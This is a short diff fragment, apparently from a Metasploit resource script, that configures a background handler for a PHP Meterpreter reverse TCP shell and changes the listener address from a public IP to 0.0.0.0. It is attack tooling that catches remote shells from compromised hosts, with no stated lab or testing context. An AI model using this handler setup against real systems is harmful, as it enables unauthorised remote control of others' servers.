@@ -195,7 +195,7 @@ sysinfo
 
  set PAYLOAD php/meterpreter/reverse_tcp
  set LPORT 443
- set LHOST 159.203.14.45
+ set LHOST 0.0.0.0
  set LPORT 4444
  set exitonsession false
  exploit -j
